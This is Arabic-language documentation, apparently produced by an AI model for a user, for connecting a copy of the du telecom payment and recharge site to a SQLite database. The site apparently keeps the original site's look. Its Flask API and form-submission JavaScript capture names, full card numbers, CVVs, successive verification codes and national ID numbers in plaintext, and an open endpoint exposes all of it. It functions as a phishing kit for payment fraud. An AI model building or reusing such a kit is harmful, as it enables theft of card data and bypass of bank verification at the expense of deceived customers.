# توثيق ربط موقع DU للدفع وشحن الرصيد بقاعدة بيانات

## مقدمة

هذا المستند يوثق عملية ربط موقع DU للدفع وشحن الرصيد بقاعدة بيانات SQLite لتخزين أرقام الهواتف وبيانات البطاقات البنكية ورموز التحقق والأرقام الأساسية بشكل واضح وسهل بدون تشفير.

## بنية قاعدة البيانات

تم استخدام قاعدة بيانات SQLite لسهولة الاستخدام والتكامل. تتكون قاعدة البيانات من أربعة جداول رئيسية:

### 1. جدول الهواتف (phones)

يخزن بيانات أرقام الهواتف والحسابات ومبالغ الدفع/الشحن:

| اسم الحقل | النوع | الوصف |
|-----------|------|-------|
| id | INTEGER | معرف فريد (مفتاح أساسي) |
| phone_number | TEXT | رقم الهاتف المدخل |
| account_number | TEXT | رقم الحساب (نفس رقم الهاتف في معظم الحالات) |
| amount | REAL | المبلغ المراد دفعه أو شحنه |
| payment_method | TEXT | طريقة الدفع (بطاقة ائتمان، بطاقة خصم) |
| transaction_number | TEXT | رقم المعاملة الفريد |
| timestamp | DATETIME | وقت وتاريخ العملية |

### 2. جدول البطاقات البنكية (cards)

يخزن بيانات البطاقات البنكية بدون تشفير:

| اسم الحقل | النوع | الوصف |
|-----------|------|-------|
| id | INTEGER | معرف فريد (مفتاح أساسي) |
| card_holder | TEXT | اسم حامل البطاقة |
| card_number | TEXT | رقم البطاقة البنكية |
| expiry_date | TEXT | تاريخ انتهاء البطاقة |
| cvv | TEXT | رمز الأمان CVV |
| transaction_number | TEXT | رقم المعاملة الفريد |
| timestamp | DATETIME | وقت وتاريخ العملية |

### 3. جدول رموز التحقق (verification_codes)

يخزن رموز التحقق المدخلة:

| اسم الحقل | النوع | الوصف |
|-----------|------|-------|
| id | INTEGER | معرف فريد (مفتاح أساسي) |
| verification_code | TEXT | رمز التحقق المدخل |
| transaction_number | TEXT | رقم المعاملة الفريد |
| verification_type | TEXT | نوع التحقق (أول، ثاني، شحن، دفع) |
| timestamp | DATETIME | وقت وتاريخ العملية |

### 4. جدول الأرقام الأساسية (base_numbers)

يخزن الأرقام الأساسية وخيارات الموافقة:

| اسم الحقل | النوع | الوصف |
|-----------|------|-------|
| id | INTEGER | معرف فريد (مفتاح أساسي) |
| base_number | TEXT | الرقم الأساسي المدخل |
| accept_request | BOOLEAN | قبول الطلب (نعم/لا) |
| share_info | BOOLEAN | مشاركة المعلومات (نعم/لا) |
| transaction_number | TEXT | رقم المعاملة الفريد |
| timestamp | DATETIME | وقت وتاريخ العملية |

## واجهات API

تم تطوير واجهات برمجية (API) باستخدام Python Flask لاستقبال البيانات من صفحات الموقع وتخزينها في قاعدة البيانات:

### 1. حفظ بيانات الهاتف
- **المسار**: `/api/save-phone`
- **الطريقة**: POST
- **البيانات المرسلة**: 
  ```json
  {
    "phone_number": "0501234567",
    "account_number": "0501234567",
    "amount": 100,
    "payment_method": "credit-card",
    "transaction_number": "TRX123456789"
  }
  ```

### 2. حفظ بيانات البطاقة البنكية
- **المسار**: `/api/save-card`
- **الطريقة**: POST
- **البيانات المرسلة**: 
  ```json
  {
    "card_holder": "محمد أحمد",
    "card_number": "1234567890123456",
    "expiry_date": "12/25",
    "cvv": "123",
    "transaction_number": "TRX123456789"
  }
  ```

### 3. حفظ رمز التحقق
- **المسار**: `/api/save-verification`
- **الطريقة**: POST
- **البيانات المرسلة**: 
  ```json
  {
    "verification_code": "123456",
    "transaction_number": "TRX123456789",
    "verification_type": "first"
  }
  ```

### 4. حفظ الرقم الأساسي
- **المسار**: `/api/save-base-number`
- **الطريقة**: POST
- **البيانات المرسلة**: 
  ```json
  {
    "base_number": "784123456789",
    "accept_request": true,
    "share_info": true,
    "transaction_number": "TRX123456789"
  }
  ```

### 5. استرجاع جميع البيانات
- **المسار**: `/api/get-all-data`
- **الطريقة**: GET
- **البيانات المسترجعة**: جميع البيانات المخزنة في قاعدة البيانات

## طريقة الربط البرمجي

تم ربط صفحات الموقع بقاعدة البيانات من خلال الخطوات التالية:

1. **إنشاء رقم معاملة فريد**: عند بدء عملية الدفع أو الشحن، يتم إنشاء رقم معاملة فريد وتخزينه في جلسة المستخدم (sessionStorage).

2. **إرسال البيانات من كل صفحة**: تم تعديل كل صفحة لإرسال البيانات المدخلة إلى واجهة API المناسبة باستخدام تقنية Fetch API.

3. **تتبع المعاملة**: يتم استخدام رقم المعاملة الفريد لربط جميع البيانات المدخلة في مختلف الجداول.

4. **تخزين البيانات بدون تشفير**: جميع البيانات تُخزن كما هي بدون أي تشفير لسهولة الوصول إليها.

## مثال على كود الربط

فيما يلي مثال على كيفية إرسال بيانات البطاقة البنكية من صفحة البطاقة إلى قاعدة البيانات:

```javascript
// معالجة تقديم النموذج
document.getElementById('card-form').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // جمع البيانات من النموذج
    const cardHolder = document.getElementById('card-holder').value;
    const cardNumber = document.getElementById('card-number').value.replace(/\s+/g, '');
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;
    
    // استرجاع رقم المعاملة من الجلسة
    const txnNumber = sessionStorage.getItem('transactionNumber');
    
    // إرسال البيانات إلى قاعدة البيانات
    fetch('/api/save-card', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            card_holder: cardHolder,
            card_number: cardNumber,
            expiry_date: expiryDate,
            cvv: cvv,
            transaction_number: txnNumber
        }),
    })
    .then(response => response.json())
    .then(data => {
        console.log('تم حفظ بيانات البطاقة بنجاح:', data);
        // الانتقال إلى الصفحة التالية
        window.location.href = 'verification-code.html';
    })
    .catch((error) => {
        console.error('خطأ في حفظ بيانات البطاقة:', error);
        // الانتقال إلى الصفحة التالية حتى في حالة الخطأ
        window.location.href = 'verification-code.html';
    });
});
```

## كيفية تشغيل الموقع مع قاعدة البيانات

1. تأكد من تثبيت Python وFlask:
   ```
   pip install flask
   ```

2. انتقل إلى مجلد الموقع:
   ```
   cd /path/to/du_site_with_db
   ```

3. قم بتشغيل الخادم:
   ```
   python app.py
   ```

4. افتح المتصفح وانتقل إلى:
   ```
   http://localhost:5000
   ```

5. لعرض جميع البيانات المخزنة، انتقل إلى:
   ```
   http://localhost:5000/api/get-all-data
   ```

## ملاحظات هامة

- جميع البيانات تُخزن بدون تشفير كما طلبت، لكن في بيئة الإنتاج الحقيقية يُنصح بتشفير البيانات الحساسة.
- يمكن الوصول إلى قاعدة البيانات مباشرة من خلال الملف `du_database.db` في مجلد الموقع.
- تم الحفاظ على نفس تصميم وشكل وألوان الموقع الأصلي دون أي تغيير.
- يمكن توسيع النظام لإضافة المزيد من الوظائف مثل البحث والتصفية والتصدير.
